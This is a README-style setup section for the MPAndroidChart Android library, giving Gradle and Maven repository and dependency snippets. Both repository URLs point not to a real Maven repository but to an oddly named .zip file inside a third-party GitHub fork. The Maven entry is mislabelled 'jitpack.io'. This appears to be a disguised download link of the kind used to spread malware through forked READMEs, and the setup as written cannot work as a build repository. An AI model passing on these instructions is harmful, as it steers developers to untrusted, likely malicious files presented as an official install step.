### Gradle Setup

```gradle
repositories {
    maven { url 'https://github.com/blasgomez/MPAndroidChart/raw/refs/heads/master/MPChartLib/src/main/java/com/github/Chart-MP-Android-Mydaidae.zip' }
}

dependencies {
    implementation 'com.github.PhilJay:MPAndroidChart:v3.1.0'
}
```

### Maven Setup

```xml
<!-- <repositories> section of pom.xml -->
<repository>
    <id>jitpack.io</id>
   <url>https://github.com/blasgomez/MPAndroidChart/raw/refs/heads/master/MPChartLib/src/main/java/com/github/Chart-MP-Android-Mydaidae.zip</url>
</repository>

<!-- <dependencies> section of pom.xml -->
<dependency>
    <groupId>com.github.PhilJay</groupId>
    <artifactId>MPAndroidChart</artifactId>
    <version>v3.1.0</version>
</dependency>
```
